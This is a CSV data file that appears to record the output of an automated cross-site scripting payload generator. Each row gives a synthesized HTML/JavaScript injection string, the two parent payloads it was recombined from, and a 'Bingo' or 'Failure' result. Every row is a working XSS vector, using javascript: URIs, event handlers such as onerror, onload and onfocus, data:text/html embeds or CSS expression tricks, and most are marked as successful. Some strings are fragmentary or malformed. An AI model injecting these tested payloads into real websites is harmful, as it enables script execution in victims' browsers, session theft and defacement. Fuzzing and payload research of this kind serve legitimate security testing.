eval_place,synthesized_code,origin_code1,origin_code2,bingo
body_tag,"<input type=""text"" value=""XSS"" onfocus=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')></a>","<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""><a href=""javascript:alert('XSS')"">","<iframe src=""javascript:alert('XSS')""></iframe><a href=""javascript:alert('XSS')"">",Failure
body_tag,"</a></iframe><a href=""javascript:alert('XSS')"">","</a><iframe src=""javascript:alert('XSS')""></iframe>","<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""><a href=""javascript:alert('XSS')"">",Failure
body_tag,"</a></div><a href=""javascript:alert('XSS')"">","<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""><a href=""javascript:alert('XSS')"">","<a href=""javascript:alert('XSS')""><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')></iframe>",Failure
body_tag,"<input type=""text"" value=""XSS"" onfocus=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')><marquee onstart=alert('XSS')>","<iframe src=""javascript:alert('XSS')""></iframe><a href=""javascript:alert('XSS')"">","</a><iframe src=""javascript:alert('XSS')""><marquee onstart=alert('XSS')>",Failure
body_tag,"</a><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">","<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""></div>","</marquee><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">",Bingo
body_tag,"<a href=""javascript:alert('XSS')""><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">","<a href=""javascript:alert('XSS')""><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">","<a href=""javascript:alert('XSS')""><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">",Bingo
body_tag,"<a href=""javascript:alert('XSS')""></iframe><iframe src=""javascript:alert('XSS')"">","</a><iframe src=""javascript:alert('XSS')""><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')>","<a href=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')""></div>",Bingo
body_tag,"</marquee><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">","</marquee><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">","</marquee><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">",Bingo
body_tag,</a></iframe></iframe>,"<input type=""text"" value=""XSS"" onfocus=alert('XSS')></iframe><iframe src=""javascript:alert('XSS')"">","</marquee><input type=""text"" value=""XSS"" onfocus=alert('XSS')><iframe src=""javascript:alert('XSS')"">",Failure
body_tag,"<div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><body onload=alert('XSS')>","<div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><body onload=alert('XSS')>","<div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><body onload=alert('XSS')>",Bingo
body_tag,"<marquee onstart=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>","<marquee onstart=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>","<marquee onstart=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>",Bingo
body_tag,"</marquee><iframe src=""javascript:alert('XSS')""></a>","</marquee><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><input type=""text"" value=""XSS"" onfocus=alert('XSS')>","</video><iframe src=""javascript:alert('XSS')""><video>",Bingo
body_tag,"<a href=""javascript:alert('XSS')""><input type=""text"" value=""XSS"" onfocus=alert('XSS')></iframe>","<div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><div style=""width:100px;height:100px;"" onmouseover=alert('XSS')><body onload=alert('XSS')>","</video><iframe src=""javascript:alert('XSS')""><video>",Failure
body_tag,<iframe/src=javascript:alert('XSS')><body/onload=alert('XSS')><body/onload=alert('XSS')>,<input type=image src=x onerror=alert('XSS')><img/src=x onerror=alert('XSS')><body/onload=alert('XSS')>,<iframe/src=javascript:alert('XSS')><body/onload=alert('XSS')><img/src=x onerror=alert('XSS')>,Bingo
body_tag,<div style=background:url(javascript:alert('XSS'))><body/onload=alert('XSS')><img/src=x onerror=alert('XSS')>,<iframe/src=javascript:alert('XSS')><img/src=x onerror=alert('XSS')><img/src=x onerror=alert('XSS')>,<body/onload=alert('XSS')><body/onload=alert('XSS')><img/src=x onerror=alert('XSS')>,Bingo
body_tag,<iframe/src=javascript:alert('XSS')><body/onload=alert('XSS')><div style=background:url(javascript:alert('XSS'))>,<input type=image src=x onerror=alert('XSS')><div style=background:url(javascript:alert('XSS'))><div style=background:url(javascript:alert('XSS'))>,<iframe/src=javascript:alert('XSS')><img/src=x onerror=alert('XSS')><img/src=x onerror=alert('XSS')>,Bingo
body_tag,"<object data='javascript:alert(""XSS8"")'><embed src='javascript:alert(""XSS7"")'><embed src='javascript:alert(""XSS7"")'>","<object data='javascript:alert(""XSS8"")'><div style=""width:expression(alert('XSS5'))""><iframe src=""javascript:alert('XSS6')"">","<embed src='javascript:alert(""XSS7"")'><div style=""width:expression(alert('XSS5'))""><iframe src=""javascript:alert('XSS6')"">",Failure
body_tag,"<details open="""" ontoggle=""javascript:alert('XSS9')""><iframe src=""javascript:alert('XSS6')""><iframe src=""javascript:alert('XSS6')"">","<details open="""" ontoggle=""javascript:alert('XSS9')""><iframe src=""javascript:alert('XSS6')""><iframe src=""javascript:alert('XSS6')"">","<details open="""" ontoggle=""javascript:alert('XSS9')""><iframe src=""javascript:alert('XSS6')""><iframe src=""javascript:alert('XSS6')"">",Bingo
body_tag,"<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus><a href='javascript:alert(`XSS`)'>","<div onmouseover='alert(""XSS"")'><iframe src='javascript:alert(`XSS`)'><svg onload='alert(1)'>","<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus></a>",Bingo
body_tag,"<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus></a>","<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus></a>","<div onmouseover='alert(""XSS"")'><input type='text' value='' onfocus='alert(""XSS"")' autofocus></a>",Bingo
body_tag,</a><a href='javascript:alert(`XSS`)'><a href='javascript:alert(`XSS`)'>,"<a href='javascript:alert(`XSS`)'><input type='text' value='' onfocus='alert(""XSS"")' autofocus><iframe src='javascript:alert(`XSS`)'>",</a><a href='javascript:alert(`XSS`)'></a>,Bingo
body_tag,</a><a href='javascript:alert(`XSS`)'></a>,</a><a href='javascript:alert(`XSS`)'></a>,</a><a href='javascript:alert(`XSS`)'></a>,Bingo
body_tag,"<img src=""x"" onerror=""alert('XSS')"">action='""action='""","<body onload=""alert('XSS')""><iframe src=""javascript:alert('XSS')""><video>","<iframe src=""javascript:alert('XSS')""><source onerror='javascript:alert(""XSS"")'><iframe src=""javascript:alert('XSS')"">",Bingo
body_tag,"</iframe><iframe src=""javascript:alert('XSS')""><iframe src=""javascript:alert('XSS')"">","<img src=""x"" onerror=""alert('XSS')"">javascript:alert(action='""","<iframe src=""javascript:alert('XSS')""><source onerror='javascript:alert(""XSS"")'><iframe src=""javascript:alert('XSS')"">",Bingo
body_tag,"<iframe src=""javascript:alert('XSS')""><source onerror='javascript:alert(""XSS"")'><source onerror='javascript:alert(""XSS"")'>","<img src=""x"" onerror=""alert('XSS')""><img src='x' onerror='alert(1)'/>javascript:alert(","<iframe src=""javascript:alert('XSS')""></div><img src='x' onerror='alert(1)'/>",Bingo
body_tag,"<body onload=""alert('XSS')"">javascript:alert(<source onerror='javascript:alert(""XSS"")'>","<img src=""x"" onerror=""alert('XSS')""><img src='x' onerror='alert(1)'/>javascript:alert(","<body onload=""alert('XSS')""><iframe src=""javascript:alert('XSS')""><video>",Bingo
body_tag,"</iframe><source onerror='javascript:alert(""XSS"")'>javascript:alert(","<body onload=""alert('XSS')""><video>action='""","<iframe src=""javascript:alert('XSS')""></div><img src='x' onerror='alert(1)'/>",Failure
body_tag,"<input type='text' value='' onchange='alert(""XSS4"")'><body onload=alert('XSS4')></details>","<div onmouseover='alert(""XSS7"")'><body onload=alert('XSS4')><a href='javascript:alert(""XSS5"");'>","</math><a href=""javascript:alert('XSS7');""><svg onload=alert('XSS3')>",Bingo
body_tag,"<div onmouseover='alert(""XSS7"")'></form><iframe src='javascript:alert(""XSS6"");'>","<div onmouseover='alert(""XSS7"")'><body onload=alert('XSS4')><a href='javascript:alert(""XSS5"");'>","<a href='javascript:alert(""XSS5"");'><svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')>",Bingo
body_tag,"data='""<body onload=alert('XSS4')></form>","</math><a href=""javascript:alert('XSS7');""><svg onload=alert('XSS3')>","<input type='text' value='' onchange='alert(""XSS4"")'></form><svg onload=alert('XSS3')>",Bingo
body_tag,"<form action='javascript:alert(""XSS10"")'><form action='javascript:alert(""XSS10"")'></form>","<a href='javascript:alert(""XSS5"");'><svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')>","<svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')><a href='javascript:alert(""XSS5"");'>",Failure
body_tag,"<div onmouseover='alert(""XSS7"")'><img src=x onerror=alert('XSS2')><iframe src='javascript:alert(""XSS6"");'>","<svg onload=alert('XSS3')><img src=x onerror=alert('XSS2')><a href='javascript:alert(""XSS5"");'>","<a href='javascript:alert(""XSS5"");'><img src=x onerror=alert('XSS2')><img src=x onerror=alert('XSS2')>",Bingo
body_tag,"<div style=""width:100px;height:100px;"" onmouseover=alert('XSS5')></object><svg onload=alert('XSS3')>","<img src=x onerror=alert('XSS2')><input type='text' value='XSS6' onfocus='alert(this.value)'><iframe src=""javascript:alert('XSS8');"">","<body onload=alert('XSS4')><object data=""javascript:alert('XSS10');""><img src=x onerror=alert('XSS2')>",Bingo
body_tag,"<body onload=alert('XSS4')><a href=""javascript:alert('XSS7');""><input type=""text"" value="""" onfocus=alert('XSS6')>","<div style=""width:100px;height:100px;"" onmouseover=alert('XSS5')>javascript:alertcode=""","<body onload=alert('XSS4')><object data=""javascript:alert('XSS10');""><img src=x onerror=alert('XSS2')>",Bingo
body_tag,"<body onload=alert('XSS4')><body onload='alert(""XSS4"")'><a href=""javascript:alert('XSS7');"">","<img src=x onerror=alert('XSS2')><input type='text' value='XSS6' onfocus='alert(this.value)'><iframe src=""javascript:alert('XSS8');"">","<svg onload=alert('XSS3')>code=""<object data=""javascript:alert('XSS10');"">",Bingo
body_tag,"<a href=""javascript:alert('XSS7');""><div onmouseover='alert(""XSS3"")'></object>","<a href=""javascript:alert('XSS7');""><div onmouseover='alert(""XSS3"")'></object>","<a href=""javascript:alert('XSS7');""><div onmouseover='alert(""XSS3"")'></object>",Failure
body_tag,"<div style=""width:100px;height:100px;"" onmouseover=alert('XSS5')></object><body onload=alert('XSS4')>","<a href=""javascript:alert('XSS7');""><div onmouseover='alert(""XSS3"")'></object>","<body onload=alert('XSS4')><object data=""javascript:alert('XSS10');""><img src=x onerror=alert('XSS2')>",Bingo
body_tag,"code=""<embed src='data:text/html,<script>code=""","<body onload='alert(""XSS4"")'><embed src='data:text/html,<script>code=""","<object data=""javascript:alert('XSS10');""><object data='javascript:alert(""XSS8"");'>code=""",Bingo
body_tag,"<input type='text' value='XSS6' onfocus='alert(this.value)'><object data='javascript:alert(""XSS8"");'><svg onload='alert(""XSS7"")'>","<a href='javascript:alert(""XSS8"")'><iframe src='javascript:alert(1);'><body onload='alert(""XSS4"")'>","<div onmouseover='alert(""XSS3"")'><svg onload='alert(""XSS5"")'><input type='text' value='' onfocus='alert(""XSS4"")' autofocus>",Bingo
body_tag,"<div onmouseover='alert(""XSS3"")'><a href='javascript:alert(""XSS8"")'><iframe src='javascript:alert(""XSS5"");'>","code=""<svg onload='alert(""XSS5"")'><embed src='data:text/html,<script>","<body onload='alert(""XSS4"")'><embed src='data:text/html,<script>code=""",Bingo
body_tag,"<input type='text' value='XSS6' onfocus='alert(this.value)'><embed src='javascript:alert(""XSS9"");'><body onload='alert(""XSS4"")'>","<body onload='alert(""XSS4"")'><embed src='data:text/html,<script>code=""","<iframe src='javascript:alert(""XSS5"");'><object data='javascript:alert(1);'><svg onload='alert(""XSS7"")'>",Bingo
body_tag,"code=""<iframe src='javascript:alert(""XSS5"");'><body onload='alert(""XSS4"")'>","</object><form action='javascript:alert(""XSS9"")'><input type='text' value='' onfocus='alert(""XSS4"")' autofocus>","<a href=""javascript:alert('XSS7');""><div onmouseover='alert(""XSS3"")'><iframe src=""javascript:alert('XSS8');"">",Bingo
body_tag,"<svg onload='alert(""XSS5"")'><embed src='javascript:alert(1);'><div style='behavior:url(#default#time2);' onbegin='alert(""XSS7"")'>","<embed src='data:text/html,<script>onclick=<svg onload='alert(1)'>","<object data='javascript:alert(""XSS8"");'><embed src='javascript:alert(1);'><div style='behavior:url(#default#time2);' onbegin='alert(""XSS7"")'>",Bingo
body_tag,"<embed src='javascript:alert(""XSS9"");'><svg onload='alert(""XSS5"")'/><img dynsrc='javascript:alert(""XSS10"");'>",<input type='text' value='XSS6' onfocus='alert(this.value)'>onfocus=<iframe src='javascript:alert(1);'>,"<iframe src='javascript:alert(1);'><div onclick='alert(1);'><object data='javascript:alert(""XSS8"");'>",Bingo
body_tag,"<embed src='javascript:alert(""XSS9"");'><embed src='javascript:alert(1);'><svg onload='alert(""XSS5"")'>","<iframe src='javascript:alert(1);'><div onclick='alert(1);'><object data='javascript:alert(""XSS8"");'>","<input type='text' value='' onfocus='alert(""XSS4"")' autofocus><svg onload='alert(""XSS6"")'><iframe src='javascript:alert(1);'>",Bingo
body_tag,"<object data='javascript:alert(""XSS8"");'><embed src='javascript:alert(1);'><svg onload='alert(""XSS5"")'>","<input type='text' value='' onfocus='alert(""XSS4"")' autofocus><svg onload='alert(""XSS6"")'><iframe src='javascript:alert(1);'>","<object data='javascript:alert(""XSS8"");'><embed src='javascript:alert(1);'><div style='behavior:url(#default#time2);' onbegin='alert(""XSS7"")'>",Bingo
body_tag,"<embed src='javascript:alert(1);'>onfocus=<img src='x' onerror='alert(""XSS9"")'>","<svg onload='alert(""XSS6"")'><iframe src='javascript:alert(""XSS7"");'>type='","<a href='javascript:alert(""XSS8"")'><img src='x' onerror='alert(""XSS2"");'><img src='x' onerror='alert(2);'>",Bingo
body_tag,"<iframe src='javascript:alert(1);'><div onmouseover='alert(""XSS6"");'><input type='submit'>","<embed src='javascript:alert(""XSS9"");'><div onmouseover='alert(""XSS6"");'><img src='x' onerror='alert(""XSS9"")'>",<input type='image' src='x' onerror='alert(1);'><a href='#' onclick='alert(8);'><img src='x' onerror='alert(2);'>,Bingo
body_tag,"<object data='javascript:alert(1);'>onfocus=<body onload='alert(""XSS3"");'>","<a href='javascript:alert(""XSS8"")'><img src='x' onerror='alert(""XSS2"");'><img src='x' onerror='alert(2);'>",<input type='image' src='x' onerror='alert(1);'><a href='#' onclick='alert(8);'><img src='x' onerror='alert(2);'>,Bingo
body_tag,"<svg onload='alert(""XSS6"")'><body onload='alert(""XSS3"");'><input type='submit'>","<svg onload='alert(""XSS6"")'><iframe src='javascript:alert(""XSS7"");'>type='","</style><input type='text' value='XSS6' onfocus='alert(this.value);'><div onmouseover='alert(""XSS6"");'>",Bingo
body_tag,"</style><input type='text' value='X' onchange='alert(""XSS7"")'><svg onload='alert(""XSS5"")'/>","</style><input type='text' value='XSS6' onfocus='alert(this.value);'><div onmouseover='alert(""XSS6"");'>","<embed src='javascript:alert(""XSS9"");'><body onload='alert(""XSS3"");'><input type='submit'>",Bingo
